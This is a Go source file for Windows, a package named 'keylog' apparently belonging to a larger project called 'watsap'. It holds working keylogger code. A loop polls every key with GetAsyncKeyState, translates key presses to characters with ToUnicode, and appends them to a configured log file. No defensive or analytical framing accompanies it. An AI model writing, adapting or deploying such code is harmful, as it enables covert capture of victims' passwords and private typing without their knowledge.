//go:build windows
// +build windows

package keylog

import (
	"fmt"
	"os"
	"syscall"
	"unsafe"
	"watsap/utils/config"
)

var (
	user32               = syscall.NewLazyDLL("user32.dll")
	procGetAsyncKeyState = user32.NewProc("GetAsyncKeyState")
	procMapVirtualKey    = user32.NewProc("MapVirtualKeyW")
	procToUnicode        = user32.NewProc("ToUnicode")
)

const (
	MAPVK_VK_TO_CHAR = 2
)

func getAsyncKeyState(vKey int) bool {
	ret, _, _ := procGetAsyncKeyState.Call(uintptr(vKey))
	return ret&0x8000 != 0
}

func mapVirtualKey(code uint, mapType uint) uint {
	ret, _, _ := procMapVirtualKey.Call(uintptr(code), uintptr(mapType))
	return uint(ret)
}

func toUnicode(vKey uint, scanCode uint, state *byte, buf *uint16, bufSize int, flags uint) int {
	ret, _, _ := procToUnicode.Call(
		uintptr(vKey),
		uintptr(scanCode),
		uintptr(unsafe.Pointer(state)),
		uintptr(unsafe.Pointer(buf)),
		uintptr(bufSize),
		uintptr(flags),
	)
	return int(ret)
}

func InitKeyboard() {
	file, err := os.OpenFile(config.KeylogFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		config.Logger(fmt.Sprintf("[Keylog] Error opening file: %v", err), "error")
		return
	}

	defer file.Close()

	var state [256]byte
	var buf [2]uint16
	var keyState [256]bool

	for {
		for i := 0; i < 256; i++ {
			if getAsyncKeyState(i) {
				if !keyState[i] {
					scanCode := mapVirtualKey(uint(i), MAPVK_VK_TO_CHAR)
					if toUnicode(uint(i), scanCode, &state[0], &buf[0], 2, 0) > 0 {
						fmt.Fprintf(file, "%c", buf[0])
						file.Sync()
					}
					keyState[i] = true
				}
			} else {
				keyState[i] = false
			}
		}
	}
}
